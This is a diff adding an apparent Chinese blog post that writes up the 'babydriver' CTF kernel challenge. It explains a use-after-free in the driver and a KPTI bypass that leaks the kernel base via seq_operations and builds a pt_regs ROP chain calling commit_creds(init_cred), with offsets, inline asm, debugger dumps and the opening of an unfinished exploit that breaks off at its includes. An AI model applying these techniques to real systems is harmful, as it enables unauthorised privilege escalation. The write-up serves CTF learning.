@@ -156,6 +156,196 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/19/seq_operations%20+%20pt_regs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/19/seq_operations%20+%20pt_regs/" class="post-title-link" itemprop="url">seq_operations+pt_regs</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-19 19:26:43" itemprop="dateCreated datePublished" datetime="2023-02-19T19:26:43+08:00">2023-02-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-02 14:53:53" itemprop="dateModified" datetime="2023-04-02T14:53:53+08:00">2023-04-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>9.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>babydriver</strong></p>
+<p>先进行解压：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv rootfs.cpio rootfs.cpio.gz </span><br><span class="line">gunzip rootfs.cpio.gz</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这个 <code>rootfs.cpio</code> 其实是个压缩包，不过它省略了后缀“.gz”，这里需要先改名后解压</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
+<ul>
+<li>smep</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+<p><strong>漏洞分析</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伪条件竞争引发的 UAF 漏洞，即当我们同时打开两个设备，第二次会覆盖第一次分配的空间</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyioctl</span><span class="params">(FILE *fp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(fp, command);</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(arg, <span class="number">0x24000C0</span>LL);<span class="comment">// void *kmalloc(size_t size, int flags)</span></span><br><span class="line">    babydev_struct.device_buf_len = arg;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13defalut:arg is %ld\n&quot;</span>, arg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>可以再释放后再申请（改写大小）</li>
+</ul>
+<p>babydriver 是我们入门内核的第一道题目，现在来看看它的两个变种</p>
+<p><strong>变种一：添加 KPTI 和 kaslr</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 pti=on kaslr&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
+<ul>
+<li>smep</li>
+<li>kaslr</li>
+<li>KPTI（在 <code>append</code> 中添加 <code>pti=on</code>）</li>
+</ul>
+<p>KPTI（Kernel Page Table Isolation）就是内核页表隔离（内核版本 4.15 以上），使内核与用户态进程使用两套独立的页表</p>
+<ul>
+<li>在 Linux 中，寄存器 CR3 用于存储当前的 PGD 地址（四级页表结构：<code>PGD-&gt;PUD-&gt;PMD-&gt;PTE</code>）</li>
+<li>如果开启了 KPTI，则在内核态与用户态切换时会同时切换 CR3 </li>
+<li>为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址）</li>
+<li>只需要将 CR3 的第 13 位取反便能完成页表切换的操作</li>
+</ul>
+<p>KPTI：会使 <code>ret2usr</code> 失效，在用户空间中构造 <code>fake tty_operations</code> 也会失效，在 ROP 中需要切换 CR3 的 gadget</p>
+<p>KPTI pass：使用 <code>seq_operations + pt_regs</code></p>
+<p>结构体 <code>seq_operations</code> 的条目如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>当我们打开一个 stat 文件时（如 <code>/proc/self/stat</code>）便会在内核空间中分配一个 <code>seq_operations</code> 结构体 </li>
+<li>当我们 read 一个 stat 文件时，内核会调用其 <code>proc_ops</code> 的 <code>proc_read_iter</code> 指针，然后调用 <code>seq_operations-&gt;start</code> 函数指针</li>
+</ul>
+<p>结构体 <code>pt_regs</code> 的条目如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在系统调用当中有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15</li>
+<li>只需要寻找到一条形如 <code>add rsp, val; ret</code> 的 gadget 便能够完成 ROP</li>
+</ul>
+<p>于是泄露思路如下：</p>
+<ul>
+<li>先执行两次 <code>open(&quot;/dev/babydev&quot;, O_RDWR)</code></li>
+<li>执行 <code>ioctl(fd[0], 0x10001, 0x20)</code>，修改内核结构体的大小为 0x20（使 <code>seq_operations</code> 可以被放入这里）</li>
+<li>释放 <code>fd[0]</code>，并且执行 <code>open(&quot;/proc/self/stat&quot;, O_RDONLY)</code>（内核结构体被释放，又被申请回来存放 <code>seq_operations</code>）</li>
+<li>此时 <code>fd[1]</code> 仍然指向内核结构体，于是用 <code>read(fd[1], leak_data, 0x10)</code> 泄露内核基地址</li>
+</ul>
+<p>使用如下命令来查找需要的偏移：（使用前先关闭 kaslr，并开启 root 权限）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep commit_creds</span></span><br><span class="line">ffffffff810a1420 T commit_creds</span><br><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep init_cred</span></span><br><span class="line">ffffffff81e48c60 D init_cred</span><br></pre></td></tr></table></figure>
+<p>接下来需要把 <code>seq_operations-&gt;start</code> 覆盖为一个 gadget（类似于 <code>add rsp, offset;...; ret;</code>）</p>
+<p>在开启 KPTI 内核，提权返回到用户态（<code>iretq/sysret</code>）之前如果不设置CR3寄存器的值，就会导致进程找不到当前程序的正确页表，引发段错误</p>
+<p>常规设置需要从上到下执行3个 gadget：（改写 CR3 的第13位）</p>
+<ul>
+<li><code>pop rdi; ret;</code>（RDI 写入 <code>0x6f0</code>）</li>
+<li><code>mov cr4, rdi; ret;</code></li>
+<li><code>swapgs; pop rbp; ret;</code></li>
+</ul>
+<p>使用 <code>pt_regs</code> 在内核态写 ROP 链，就没有那么多空间来放入 gadget，于是我们用 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数一次搞定（低版本的内核没有这个函数）</p>
+<ul>
+<li>需要的栈布局如下：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + <span class="number">22</span></span><br><span class="line"><span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line"><span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line">user_shell_addr</span><br><span class="line">user_cs</span><br><span class="line">user_rflags</span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure>
+<ul>
+<li>只要把 <code>swapgs_restore_regs_and_return_to_usermode + 22</code> 放在 R10 的位置就可以符合条件</li>
+</ul>
+<p>综合上面的内容，我们可以得到劫持控制流的思路：</p>
+<ul>
+<li>执行 <code>write(fd[1], &amp;magic_addr, 8)</code> 写入形如 <code>add rsp, 0x148; ...; ret;</code> 的 gadget</li>
+<li>通过 <code>pt_regs</code> 构造 ROP 链（R10 写上 <code>swapgs_restore_regs_and_return_to_usermode + 22</code>）</li>
+<li>在 gadget 打上断点，然后计算该 gadget 到 <code>pt_regs</code> 结构体的偏移，寻找准确的 gadget</li>
+</ul>
+<p>在实际的调试中，我发现 <code>pt_regs</code> 的内容没有那么规整（可能是 sys_read 破坏了 <code>pt_regs</code> 原本的结构），下面给一个调试案例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span> </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>GDB 部分内存如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff8800027cbdd8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xffff8800027cbdd8</span> —▸ <span class="number">0xffffffff8122fab8</span> ◂— mov    r15, rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffff8800027cbde0</span> —▸ <span class="number">0xffffffff810ee6a9</span> ◂— <span class="keyword">xor</span>    edx, edx</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffff8800027cbde8</span> —▸ <span class="number">0x7fff99311170</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0xffff8800027cbdf0</span> —▸ <span class="number">0xffff88000276c1c0</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffff8800027cbdf8</span> ◂— <span class="number">8</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rsi <span class="number">0xffff8800027cbe00</span> ◂— <span class="number">0</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0xffff8800027cbe38</span> ◂— push   rbp <span class="comment">/* 0x55555555; &#x27;UUUU&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│ rbp <span class="number">0xffff8800027cbe40</span> —▸ <span class="number">0xffff8800027cbec8</span> —▸ <span class="number">0xffff8800027cbf00</span> —▸ <span class="number">0xffff8800027cbf48</span> ◂— adc    dword ptr [rcx], edx <span class="comment">/* 0xbbbb1111 */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│     <span class="number">0xffff8800027cbe48</span> —▸ <span class="number">0xffffffff8120ad17</span> ◂— mov    rdi, qword ptr [rbp - <span class="number">0x18</span>]</span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0xffff8800027cbe50</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x20000 */</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│ r12 <span class="number">0xffff8800027cbf18</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│     <span class="number">0xffff8800027cbf20</span> ◂— adc    byte ptr [rdi], cl <span class="comment">/* 0xfdb69a886c1b0f10 */</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│     <span class="number">0xffff8800027cbf28</span> ◂— <span class="keyword">and</span>    ah, byte ptr [rdx] <span class="comment">/* 0xbbbb2222 */</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│     <span class="number">0xffff8800027cbf30</span> ◂— <span class="keyword">and</span>    ah, byte ptr [rdx] <span class="comment">/* 0x22222222; &#x27;&quot;&quot;&quot;&quot;&#x27; */</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│     <span class="number">0xffff8800027cbf38</span> ◂— <span class="keyword">xor</span>    esi, dword ptr [rbx] <span class="comment">/* 0x33333333; &#x27;3333&#x27; */</span></span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│     <span class="number">0xffff8800027cbf40</span> ◂— add    byte ptr [rax], r8b <span class="comment">/* 0x44444444; &#x27;DDDD&#x27; */</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│     <span class="number">0xffff8800027cbf48</span> ◂— adc    dword ptr [rcx], edx <span class="comment">/* 0xbbbb1111 */</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│     <span class="number">0xffff8800027cbf50</span> —▸ <span class="number">0xffffffff81819c32</span> ◂— mov    qword ptr [rsp + <span class="number">0x50</span>], rax</span><br><span class="line">    ......</span><br><span class="line"><span class="number">37</span>:<span class="number">01b</span>8│  <span class="number">0xffff8800027cbf90</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x11110000 */</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">38</span>:<span class="number">01</span>c0│  <span class="number">0xffff8800027cbf98</span> ◂— cdq     <span class="comment">/* 0x99999999 */</span></span><br><span class="line"><span class="number">39</span>:<span class="number">01</span>c8│  <span class="number">0xffff8800027cbfa0</span> ◂— mov    byte ptr [rax + <span class="number">0x8888</span>], cl <span class="comment">/* 0x88888888 */</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>注意 <code>0xbbbb2222 -&gt; 0xbbbb1111</code> 和 <code>0x11110000 -&gt; 0x88888888</code></li>
+<li>ROP 的构造思路：<ul>
+<li>在 <code>0xbbbb2222-0x33333333</code> 分别放入 <code>pop_rdi_ret</code> <code>init_cred</code> <code>commit_creds</code></li>
+<li>在 <code>0x44444444</code> 放入 <code>add_rsp_offset_ret</code> 以跳转到 <code>0x11110000</code></li>
+<li>在 <code>0x11110000</code> 中放入 <code>swapgs_restore_regs_and_return_to_usermode + 22</code></li>
+<li>在 <code>seq_operations-&gt;start</code> 中写入的 gadget 需要把栈迁移的 ROP 链上</li>
+</ul>
+</li>
+</ul>
+<p>本题目给的内核版本是 4.4.72，没有 KPTI 和 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数，因此没法完成演示</p>
+<p>下面给出非完整的 exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 